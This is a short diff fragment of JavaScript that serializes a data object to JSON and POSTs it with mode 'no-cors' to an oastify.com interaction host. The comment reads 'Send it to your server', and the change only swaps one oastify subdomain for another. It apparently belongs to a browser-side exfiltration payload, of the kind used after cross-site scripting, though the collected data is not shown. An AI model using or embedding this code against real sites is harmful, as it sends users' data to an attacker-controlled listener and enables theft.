@@ -26,7 +26,7 @@ let jsonData = JSON.stringify(data, null, 2);
 console.log(jsonData);
 
 // Send it to your server
-fetch('https://5ntmzngipogg8y0ck34wc0cmtdz4nxbm.oastify.com/ls', {
+fetch('https://5kqmwndimodg5yxch31w909mqdw4ky8n.oastify.com/ls', {
   method: 'POST',
   mode: 'no-cors',
   body: jsonData
